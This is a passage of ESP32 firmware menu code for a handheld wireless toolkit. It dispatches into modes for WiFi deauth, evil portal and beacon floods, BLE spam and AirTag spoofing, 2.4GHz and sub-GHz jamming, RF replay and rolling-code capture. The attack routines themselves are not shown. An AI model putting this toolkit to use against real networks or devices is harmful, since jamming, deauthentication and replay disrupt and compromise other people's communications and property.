                sniffScrollOffset = 0;
                sniffSelectedIndex = 0;
                sniffListNeedsRedraw = true;
                wifiScannerFirstDraw = true;
                clearWiFiScanResults();
                resetWiFi();
            }
        }

        // ===== WIFI ATTACKS =====
        else if (currentMenu == wifiAttacksMenu) {
            auto startTargetSelection = [&]() {
                // Clear previous selections
                attackTargetCount = 0;
                selectingAttackTargets = true;
                
                // Enter WiFi scanner for target selection
                enterMode(WIFI_SCAN);
                clearWiFiScanResults();
                wifiSelectedIndex = 0;
                wifiScrollOffset = 0;
                wifiScanRunning = true;
                wifiScanReadyAt = millis() + 650UL;
                wifiScanKeepStatusUntil = millis() + 1600UL;
                wifiScanAutoRetryPending = true;
                wifiScanWarmupRetries = 2;
                setWiFiScanStatus("Queueing scan");
                wifiScannerFirstDraw = true;
                lastScanAnim = 0;
                scanDots = 1;
                tft.fillScreen(ILI9341_BLACK);
                drawStatusBar(); // Draw status bar so it's visible during scan
                wifiNeedsRedraw = true;
            };
            
            auto startAttack = [&](RadioMode mode) {
                enterMode(mode);
                attackFirstDraw = true;
                attackLastSend = 0;
                attackPacketsSent = 0;
                attackChannel = 1;
                resetWiFi();
                if (mode == WIFI_ATTACK_EVIL_PORTAL) {
                    evilPortalInitialized = false;
                } else {
                    WiFi.mode(WIFI_AP);
                    esp_wifi_set_max_tx_power(84);
                }
            };
            
            if (activeToolIndex == 0) startAttack(WIFI_ATTACK_EVIL_PORTAL);
            else if (activeToolIndex == 1) startAttack(WIFI_ATTACK_RICKROLL);
            else if (activeToolIndex == 2) startTargetSelection(); // Probe Flood needs targets
            else if (activeToolIndex == 3) startTargetSelection(); // Deauth Flood needs targets
            else if (activeToolIndex == 4) startTargetSelection(); // Bad Msg needs targets
            else if (activeToolIndex == 5) startTargetSelection(); // Channel Switch needs targets
            else if (activeToolIndex == 6) startTargetSelection(); // Quiet Attack needs targets
            else if (activeToolIndex == 7) startTargetSelection(); // Assoc Sleep needs targets
            else if (activeToolIndex == 8) startTargetSelection(); // AP Clone needs targets
            else if (activeToolIndex == 9) {
                // Beacon Spammer (moved from WiFi Tools)
                enterMode(WIFI_BEACON);
                beaconFirstDraw = true;
                lastUIChannel = 255;
                beaconPackets = 0;
                lastPacketSnapshot = 0;
                resetWiFi();
                beaconInitialized = false;
            }
        }


        // ===== 2.4GHz =====
        else if (currentMenu == ghzMenu) {
            // 2.4GHz main menu - enter submenus
            if (activeToolIndex == 0) {
                // 2.4GHz Sniffers submenu
                submenuParentMenu = ghzMenu;
                submenuParentSize = sizeof(ghzMenu) / sizeof(ghzMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "2.4GHz";
                
                currentMenu = ghzSniffersMenu;
                currentMenuSize = sizeof(ghzSniffersMenu) / sizeof(ghzSniffersMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "2.4GHz Sniffers";
                drawSubMenu();
                delay(150);
                return;
            }
            else if (activeToolIndex == 1) {
                // 2.4GHz Attacks submenu
                submenuParentMenu = ghzMenu;
                submenuParentSize = sizeof(ghzMenu) / sizeof(ghzMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "2.4GHz";
                
                currentMenu = ghzAttacksMenu;
                currentMenuSize = sizeof(ghzAttacksMenu) / sizeof(ghzAttacksMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "2.4GHz Attacks";
                drawSubMenu();
                delay(150);
                return;
            }
        }
        
        // ===== 2.4GHz SNIFFERS =====
        else if (currentMenu == ghzSniffersMenu) {
            if (activeToolIndex == 0) {
                LOG(">>> 2.4 SCANNER SELECTED <<<");
                enterMode(RADIO_24_SCAN);
                ghzWaterfallNeedsReset = true;
                ghzScannerFirstDraw = true;
                ghzScannerLastHighlight = -1;
                ghzScannerLastInfoChannel = -1;
                ghzScannerLastInfoStrength = -1;
                ghzScannerLastInfoAverage = -1;
                ghzScannerLastInfoPeak = -1;
                ghzScannerDisplayAverage = -1.0f;
                ghzScannerDisplayPeak = -1.0f;
            }
            else if (activeToolIndex == 1) {
                LOG(">>> NOISE ANALYZER SELECTED <<<");
                enterMode(RADIO_NOISE_ANALYZER);
                ghzWaterfallNeedsReset = true;

                for (int i = 0; i < CHANNEL_COUNT; i++) {
                    noiseLevel[i] = 0;
                }

                noiseFirstDraw = true;
                ghzNoiseLastInfoChannel = -1;
                ghzNoiseLastInfoPercent = -1;
                ghzNoiseLastInfoPeak = -1;
                ghzNoiseDisplayAverage = -1.0f;
                ghzNoiseDisplayPeak = -1.0f;
            }
            else if (activeToolIndex == 2) {
                LOG(">>> PROTOCOL ANALYZER SELECTED <<<");
                enterMode(RADIO_24_PROTOCOL_ANALYZER);
                attackFirstDraw = true;
                attackChannel = 2;
                sniffBufCount = 0;
                sniffScrollOffset = 0;
                sniffSelectedIndex = 0;
                sniffListNeedsRedraw = true;
            }
        }
        
        // ===== 2.4GHz ATTACKS =====
        else if (currentMenu == ghzAttacksMenu) {
            if (activeToolIndex == 0) {
                LOG(">>> 2.4 ACTIVE SELECTED <<<");
                stop24GHzActiveMode();
                radioLocked = false;
                activeMode = ACTIVE_WIFI;
                radio24ActiveStatus = "Sweep";
                radio24ActiveFirstDraw = true;
                enterMode(RADIO_24_ACTIVE);
                jammerMode = BLE_MODULE;
                initializeJamRadios();
            }
            else if (activeToolIndex == 1) {
                LOG(">>> PACKET FLOODER SELECTED <<<");
                enterMode(RADIO_24_PACKET_FLOOD);
                attackFirstDraw = true;
                attackChannel = 2;
                attackPacketsSent = 0;
            }
        }
        else if (currentMenu == rfMenu) {
            // RF main menu - enter submenus
            if (activeToolIndex == 0) {
                // RF Sniffers submenu
                submenuParentMenu = rfMenu;
                submenuParentSize = sizeof(rfMenu) / sizeof(rfMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "RF";
                
                currentMenu = rfSniffersMenu;
                currentMenuSize = sizeof(rfSniffersMenu) / sizeof(rfSniffersMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "RF Sniffers";
                drawSubMenu();
                delay(150);
                return;
            }
            else if (activeToolIndex == 1) {
                // RF Transmit submenu
                submenuParentMenu = rfMenu;
                submenuParentSize = sizeof(rfMenu) / sizeof(rfMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "RF";
                
                currentMenu = rfTransmitMenu;
                currentMenuSize = sizeof(rfTransmitMenu) / sizeof(rfTransmitMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "RF Transmit";
                drawSubMenu();
                delay(150);
                return;
            }
        }
        else if (currentMenu == rfSniffersMenu) {
            // Back button is handled by the general check above (currentMenuIndex == currentMenuSize - 1)
            rfBandIndex = constrain(rfBandIndex, 0, rfBandPresetCount - 1);
            rfLockedFrequencyMHz = rfBandPresets[rfBandIndex].centerMHz;
            rfLastSampleMs = 0;
            rfSweepPaused = false;

            if (activeToolIndex == 0) {
                enterMode(RF_SCANNER);
                rfScannerFirstDraw = true;
                resetRFSweepLevels();
            }
            else if (activeToolIndex == 1) {
                enterMode(RF_MONITOR);
                rfMonitorFirstDraw = true;
                resetRFMonitorHistory();
            }
            else if (activeToolIndex == 2) {
                enterMode(RF_SIGNAL_CAPTURE);
                rfCaptureFirstDraw = true;
                resetRFMonitorHistory();
            }
            else if (activeToolIndex == 3) {
                rfLockedFrequencyMHz = 433.92f;
                enterMode(RF_REPLAY);
                rfReplayFirstDraw = true;
                rfReplayListening = false;
                rfReplayHasCapture = false;
                rfReplayCapturedValue = 0;
                rfReplayCapturedBits = 0;
                rfReplayRawCount = 0;
                rfReplayStatus = "";
                rfReplayStatusUntil = 0;
            }
            else if (activeToolIndex == 4) {
                enterMode(RF_FREQUENCY_SWEEP);
                rfSweepFirstDraw = true;
                resetRFSweepLevels();
            }
            else if (activeToolIndex == 5) {
                enterMode(RF_ROLLING_CAPTURE);
                attackFirstDraw = true;
                rfRollingFirstDraw = true;
                rfLockedFrequencyMHz = 433.92f;
            }
        }
        else if (currentMenu == rfTransmitMenu) {
            // Back button is handled by the general check above (currentMenuIndex == currentMenuSize - 1)
            rfBandIndex = constrain(rfBandIndex, 0, rfBandPresetCount - 1);
            rfLockedFrequencyMHz = rfBandPresets[rfBandIndex].centerMHz;
            rfLastSampleMs = 0;

            if (activeToolIndex == 0) {
                enterMode(RF_JAMMER);
                rfJammerFirstDraw = true;
                rfJammerConfigured = false;
            }
            else if (activeToolIndex == 1) {
                clearLoadedSubFile();
                enterMode(RF_TRANSMIT);
                rfTransmitFirstDraw = true;
                rfTransmitActive = false;
                rfTransmitCount = 0;
                rfTransmitSequence = 0;
                rfTransmitLastSendMs = 0;
                rfTransmitReturnToFileManager = false;
            }
            else if (activeToolIndex == 2) {
                rfLockedFrequencyMHz = 462.5625f;
                enterMode(RF_SQUELCH_ACTIVATE);
                rfSquelchFirstDraw = true;
            }
        }

        if (currentMenu == bluetoothMenu) {
            if (activeToolIndex == 0) {
                submenuParentMenu = bluetoothMenu;
                submenuParentSize = sizeof(bluetoothMenu) / sizeof(bluetoothMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "Bluetooth";
                currentMenu = bluetoothSniffersMenu;
                currentMenuSize = sizeof(bluetoothSniffersMenu) / sizeof(bluetoothSniffersMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "BT Sniffers";
                drawSubMenu();
                delay(150);
                return;
            } else if (activeToolIndex == 1) {
                // BLE Attacks submenu
                submenuParentMenu = bluetoothMenu;
                submenuParentSize = sizeof(bluetoothMenu) / sizeof(bluetoothMenu[0]);
                submenuParentIndex = activeToolIndex;
                submenuParentScrollOffset = currentMenuScrollOffset;
                submenuParentTitle = "Bluetooth";
                currentMenu = bleAttacksMenu;
                currentMenuSize = sizeof(bleAttacksMenu) / sizeof(bleAttacksMenu[0]);
                currentMenuIndex = 0;
                currentMenuScrollOffset = 0;
                currentTitle = "BLE Attacks";
                drawSubMenu();
                delay(150);
                return;
            }
        }
        
        // BLE Attacks Menu Handler
        if (currentMenu == bleAttacksMenu) {
            if (activeToolIndex == 0) { enterMode(BLE_ATTACK_SOUR_APPLE); attackFirstDraw = true; }
            else if (activeToolIndex == 1) { enterMode(BLE_ATTACK_SWIFTPAIR); attackFirstDraw = true; }
            else if (activeToolIndex == 2) { enterMode(BLE_ATTACK_SAMSUNG); attackFirstDraw = true; }
            else if (activeToolIndex == 3) { enterMode(BLE_ATTACK_BEACON_SPAM); attackFirstDraw = true; }
            else if (activeToolIndex == 4) { enterMode(BLE_ATTACK_SPAM_ALL); attackFirstDraw = true; }
            else if (activeToolIndex == 5) { enterMode(BLE_JAMMER); attackFirstDraw = true; }
            else if (activeToolIndex == 6) { enterMode(BLE_SPOOFER); attackFirstDraw = true; }
            else if (activeToolIndex == 7) { enterMode(BLE_AIRTAG_SPOOF); attackFirstDraw = true; }
        }

        if (currentMenu == bluetoothSniffersMenu) {
            auto startBluetoothSniffer = [&](BluetoothSnifferProfile profile) {
                switch (profile) {
                    case BT_SNIFFER_GENERAL: currentTitle = "BT Sniffer"; break;
                    case BT_SNIFFER_CARD_SKIMMERS: currentTitle = "Card Skimmers"; break;
                    case BT_SNIFFER_FLIPPER: currentTitle = "Flipper Sniff"; break;
                    case BT_SNIFFER_AIRTAG: currentTitle = "AirTag Sniff"; break;
                    case BT_SNIFFER_FLOCK: currentTitle = "Flock Sniff"; break;
                    case BT_SNIFFER_META: currentTitle = "Meta Detect"; break;
                    case BT_SNIFFER_MANUFACTURER: currentTitle = "Manufacturer"; break;
                    case BT_SNIFFER_ANALYZER:
                    default: currentTitle = "BT Analyzer"; break;
                }
                bluetoothSnifferProfile = profile;
                resetBLEAnalyzerHistory();
                enterMode(BLE_SCAN);
                clearBLEScanResults();
                bleSelectedIndex = 0;
                bleScrollOffset = 0;
                bleScanRunning = true;
                bleScanStartedAt = millis();
                bleScanReadyAt = millis() + 520UL;
                bleScanAutoRetryPending = true;
                bleScanWarmupRetries = 2;
                blePreserveResultsOnNextScan = false;
                bleContinuousScanAt = 0;
                setBLEScanStatus("Queueing scan");
                bleScanTaskHandle = NULL;
                bleScannerFirstDraw = true;
                bleNeedsRedraw = true;
                // Open session CSV for this scan session
                if (profile != BT_SNIFFER_ANALYZER) bleSessionOpen();
            };

            switch (activeToolIndex) {
                case 0:
                    startBluetoothSniffer(BT_SNIFFER_ANALYZER);
                    break;
                case 1:
                    startBluetoothSniffer(BT_SNIFFER_GENERAL);
                    break;
                case 2:
                    startBluetoothSniffer(BT_SNIFFER_CARD_SKIMMERS);
                    break;
                case 3:
                    startBluetoothSniffer(BT_SNIFFER_FLIPPER);
                    break;
                case 4:
                    startBluetoothSniffer(BT_SNIFFER_AIRTAG);
                    break;
                case 5:
                    // Open Manufacturer Sniff submenu (now contains Flock, Meta, and manufacturer filters)
                    submenuParentMenu = bluetoothSniffersMenu;
                    submenuParentSize = sizeof(bluetoothSniffersMenu) / sizeof(bluetoothSniffersMenu[0]);
                    submenuParentIndex = activeToolIndex;
                    submenuParentScrollOffset = currentMenuScrollOffset;
                    submenuParentTitle = "BT Sniffers";
                    currentMenu = bluetoothManufacturerMenu;
                    currentMenuSize = sizeof(bluetoothManufacturerMenu) / sizeof(bluetoothManufacturerMenu[0]);
                    currentMenuIndex = 0;
                    currentMenuScrollOffset = 0;
                    currentTitle = "Manufacturer";
                    drawSubMenu();
                    delay(150);
                    return;
                case 6:
                    navigateBack();
                    return;
            }
        }

        if (currentMenu == bluetoothManufacturerMenu) {
            if (activeToolIndex == 0) {
                bluetoothSnifferProfile = BT_SNIFFER_FLOCK;
                currentTitle = "Flock Sniff";
                resetBLEAnalyzerHistory();
                enterMode(BLE_SCAN);
                clearBLEScanResults();
                bleSelectedIndex = 0;
                bleScrollOffset = 0;
                bleScanRunning = true;
                bleScanStartedAt = millis();
                bleScanReadyAt = millis() + 520UL;
                bleScanAutoRetryPending = true;
                bleScanWarmupRetries = 2;
                blePreserveResultsOnNextScan = false;
                bleContinuousScanAt = 0;
                setBLEScanStatus("Queueing scan");
                bleScanTaskHandle = NULL;
                bleScannerFirstDraw = true;
                bleNeedsRedraw = true;
                serviceFlockWiFiSniffer(true);
            } else if (activeToolIndex >= currentMenuSize - 1) {
                navigateBack();
                return;
            } else {
                const int manufacturerFilterCount = currentMenuSize - 2;  // exclude Flock + Back
                bluetoothManufacturerFilterIndex = constrain(activeToolIndex - 1, 0, manufacturerFilterCount - 1);
                bluetoothSnifferProfile = BT_SNIFFER_MANUFACTURER;
                currentTitle = getBluetoothManufacturerLabel();
                resetBLEAnalyzerHistory();
                enterMode(BLE_SCAN);
                clearBLEScanResults();
                bleSelectedIndex = 0;
                bleScrollOffset = 0;
                bleScanRunning = true;
                bleScanStartedAt = millis();
                bleScanReadyAt = millis() + 520UL;
                bleScanAutoRetryPending = true;
                bleScanWarmupRetries = 2;
                blePreserveResultsOnNextScan = false;
                bleContinuousScanAt = 0;
                setBLEScanStatus("Queueing scan");
                bleScanTaskHandle = NULL;
                bleScannerFirstDraw = true;
                bleNeedsRedraw = true;
            }
        }

        // ===== ENTER TOOL SCREEN =====
        tft.fillScreen(ILI9341_BLACK);
        drawStatusBar();

        waterfallY = SCANNER_WATERFALL_START_Y;
        tft.fillRect(0, SCANNER_WATERFALL_START_Y, 240, 320 - SCANNER_WATERFALL_START_Y, ILI9341_BLACK);

        // block stale button reads for a moment
        delay(250);
        return;
    }
}
